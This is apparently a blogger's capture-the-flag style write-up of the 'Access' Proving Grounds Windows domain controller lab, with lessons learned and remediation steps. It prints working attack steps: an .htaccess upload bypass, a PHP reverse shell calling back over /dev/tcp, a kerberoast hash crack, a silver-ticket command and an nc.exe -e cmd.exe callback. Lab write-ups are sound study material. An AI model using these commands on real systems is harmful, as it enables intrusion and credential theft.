---
layout: writeup
title: Access - Proving Grounds
date: 2024-09-04 13:32:20 +0300
description: A Writeup of the Access Box from Proving Grounds
image: # /assets/images/Access/Access.png
fig-caption: # Add figcaption (optional)
tags: [Windows, TJ Null, LainKusanagi, Active Directory, WerTrigger, Invoke-RunasCs]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Active, and it is rated Intermediate by Proving Grounds and Very hard by the community. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

It looks like we may be working with a domain controller here so I get started with the usual beginning enumeration: SMB access without auth (denied), adding the target to `/etc/hosts` (access.offsec), running feroxbuster on the web port, checking `enum4linux` (nothing), and checking if there are any unusual ports. We don't see anything especially interesting with TCP or UDP, though we do also have port 5985 so perhaps winrm access in the future. Then it's time to check out the web page:

![Access2.png](/assets/images/Access/Access2.png){: .responsive-image}

I check around looking for anything interesting and checking input fields for SQL injection. Looks like nothing here in the `Contact Us` form, but maybe there's an interesting reason why the PHP Email Form Library can't be loaded. 

![Access3.png](/assets/images/Access/Access3.png){: .responsive-image}

One field that is almost certainly interesting is when we click the `Buy Now` button for tickets, we get an Upload Image option to go with our name and email. I upload a test `.jpg` and find it in the `/uploads` directory. 

![Access4.png](/assets/images/Access/Access4.png){: .responsive-image}

We know that the server uses PHP for a few reasons (Apache server, the names of some of the return files in feroxbuster, the screenshot above), so the goal is probably to upload a PHP file in some way. A simple php file is not allowed, which we can confirm by testing it:

![Access5.png](/assets/images/Access/Access5.png){: .responsive-image}

But maybe we can upload something else. I try `.phptml`,`.php5`,`.pHP7`, but none of them work, and I assume we need to try a different approach. Uploading `.php.jpg` works, but it doesn't execute. I checked my notes and decided to try uploading a `.htaccess` file to help me execute a different file extension as php. I created the file with: `echo "AddType application/x-httpd-php .pop" > .htaccess`, and succeeded in uploading the file. Then I was able to upload `ivan445.pop`. Unfortunately when I selected it, I got an error: 
```
DAEMONIZE: pcntl_fork() does not exists, moving on...
SOC_ERROR: 10060: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
```

I think this is the error from the ivan php reverse shell, so that would mean that it did in fact execute. Maybe I can upload something else to prove it. I create `info.pop` with `<?php phpinfo();?>` and then  upload it. This time it clearly executes, so we're on the right track.

![Access6.png](/assets/images/Access/Access6.png){: .responsive-image}

I just did HTB/Updown **Add link** which used a tool called [dfunc_bypasser](https://github.com/teambi0s/dfunc-bypasser/tree/master) to check which dangerous PHP modules should be disabled, meaning for my purposes which can be exploited. I get this list:
```
Please add the following functions in your disable_functions option: 
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,ld,mail
If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket
```

One that sticks out to me is `proc_open` because I know there is a [revshells](revshells.com) php shell that uses it. So I decided to make a file out of that which looks like this:

```
<?php
$proc=proc_open("bash -c 'bash -i >&/dev/tcp/10.10.14.3/445 0>&1'",
  array(
    array("pipe","r"),
    array("pipe","w"),
    array("pipe","w")
  ),
  $pipes);
print stream_get_contents($pipes[1]);
?>
```

That failed too. Then I realized I was using my IP address for HTB which starts with `10.10...` whereas Proving Grounds starts with `192.168...`. So I update my [ivan sincek](https://github.com/ivan-sincek/php-reverse-shell) with the correct IP, upload it and it works. Oops. 

![Access7.png](/assets/images/Access/Access7.png){: .responsive-image}

I look around for a bit, and I see that there is a `svc_mssql` user in `C:\Users`, even though we don't have a port 1433 showing open. I look around for a bit and run some initial scripts including winpeas.exe. I don't find anything especially interesting, but I do find something when I use `adPEAS.ps1`. This checks for kerberoastable users, which we could do with Rubeus or something else, but it makes it nice and easy. Plus, we find something for the `svc_mssql` user:

![Access8.png](/assets/images/Access/Access8.png){: .responsive-image}

I copy this to my machine and try to crack it with hashcat, and it cracks quickly with: `hashcat -m 13100 mssql.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`. We get the credentials `mssql_svc`:`trustno1`. 

I went back with these credentials and tried to see what access I had with wirnm (none) and smb (some, but nothing on the shares). Then I tried to use `Invoke-RunasCS.ps1` from[antonioCoco](https://github.com/antonioCoco/RunasCs/tree/master), but I couldn't get that working. I furthermore couldn't find anything interesting doing manual enumeration. I did try to get a silver ticket with impacket-ticketer by importing `PowerView.ps1` to grab the domain SID and Target SPN of the  `SVC_MSSQL` user. I needed the NTLM hash too, but since I already had the password, it was easy to use [CodeBeautify.org](https://codebeautify.org/ntlm-hash-generator) to generate it. The full command was `impacket-ticketer -nthash F773C5DB7DDEBEFA4B0DAE7EE8C50AEA -domain-sid S-1-5-21-537427935-490066102-1511301751 -domain access.offsec -spn MSSQLSvc/DC.access.offsec -user-id 500 Administrator`. I couldn't get that ticket working though. 

I also checked bloodhound and did a dump of the ldap info with `ldapdomaindump`. I did notice a few kernel exploits, but I'd been hoping to avoid those, as they are often not the intended path for these labs. 

I got stuck here for a while before going back to `Invoke-RunasCs.ps1`. I tried it previously, but the issue was part of my syntax I guess. When trying to use it with the `nc.exe` binary, I did see it working in one directory and failing in another, so that was annoying. Same version and everything, I copied it from the failing directory to the working on. Ultimately the command was `Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.45.204 4444 -e cmd.exe'`. If you run the `nc.exe` binary from `C:\Users\svc_apache\nc.exe`, it fails with an error: 
```
[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
[-] RunasCsException: CreateProcessWithLogonW logon type 2 failed with error code: Access is denied
```

Running it again with the `--bypass-uac` and `--logon-type '8'` does not fix it. It turns out, because you are running it as the passed user (`svc_mssql`), you must run it from a directory that they are allowed to run it from.  Lesson learned. Regardless, once I run it correctly, I get a shell:

![Access9.png](/assets/images/Access/Access9.png){: .responsive-image}

Interesting, it looks like we have a new privilege: `SeManageVolumePrivilege`. I think I even have an exploit in my server folder for that. I can simply download the latest release of `SeManageVolumeExploit.exe` from [this](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public)github repo from `CsEnox`, and run it on the machine as is: `.\SeManageVolumeExploit.exe`. 

![Access10.png](/assets/images/Access/Access10.png){: .responsive-image}

Now - my privileges have not changed. But I can list and read files on any part of the `C:\` including the `root.txt` flag.

![Access11.png](/assets/images/Access/Access11.png){: .responsive-image}

I think this is technically enough for the OSCP, at least as far as the scoring goes. Maybe they don't count it if you don't get a privileged user, but for the screenshot you just have to have a screenshot with the ouput of `ipconfig`, `hostname`, and `type root.txt`. But we might as well get the SYSTEM access as well, given that it should be doable if we can write any file. This is more intuitive on Linux - we can just edit `/etc/password` or add a root ssh key or something. But for Windows, it's a bit less simple,but very doable. We can use an exploit called `WerTrigger.exe`, which we can find [here](https://github.com/sailay1996/WerTrigger). The instructions are very simple, and only require you to upload three files to the machine:

1. As an administrator, copy `phoneinfo.dll` to `C:\Windows\System32\`
2. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
3. Then, run `WerTrigger.exe`.
4. Enjoy a shell as NT AUTHORITY\SYSTEM.

Well I tried that, and it didn't work. 

![Access12.png](/assets/images/Access/Access12.png){: .responsive-image}

Then I tried [FileWrite2system](https://github.com/sailay1996/FileWrite2system), which didn't work either. Then I tried [UsoDllLoader](https://github.com/itm4n/UsoDllLoaderc), same thing. I tried adding a malicious `.dll` to `C:\Windows\System32\wbem\tzres.dll` and running `systeminfo`, and then adding a malicious `.dll` to `C:\Windows\System32\edgegdi.dll` and triggering it with `Update-MpSignature`. Both of those suggestions I found in a [list](https://github.com/sailay1996/awesome_windows_logical_bugs/blob/master/FileWrite2system.txt) with similar vulnerabilities for logical bugs. 

I checked for other writeups, and I found nothing suggested beyond what I'd already tried. I checked the Offsec Proving Grounds Discord and found only other people with similar difficulties. The only one who'd said they solved it just used the same `SeManageVolumeExploit.exe` that I did that helped them to read the file, but not get a SYSTEM shell. So I'm going ot have to call it. I'm sure there's a way to do the box, but it doesn't appear to be through the intended vulnerability. 

### Lessons Learned
- You have to run `Invoke-RunasCs` from a directory that the user you are trying to run commands as can access. 
- We can upload `.hataccess` so that custom extensions are executed as we say.
- The `SeManageVolume` privilege can help us to read any file.

### Remediation Steps
- Don't allow us to upload the `.htaccess` file allowing us to upload `.pop` file and execute them as `.php`, maybe this could be accomplished with an allow list. 
- Restrict the access to the `/uploads` directory entirely actually. There's no need for users of the site to access it. 
- Prevent us from kerberoasting the `svc_mssql` user, perhaps by removing the SPN if unnecessary or using a managed service account. 
- Furthermore enforce a stronger password - `trustno1` isn't going to cut it. 
- Don't allow the `svc_mssql` user the `SeManageVolume` privilege if unnecessary. 
- Other than that, great stuff apparently.
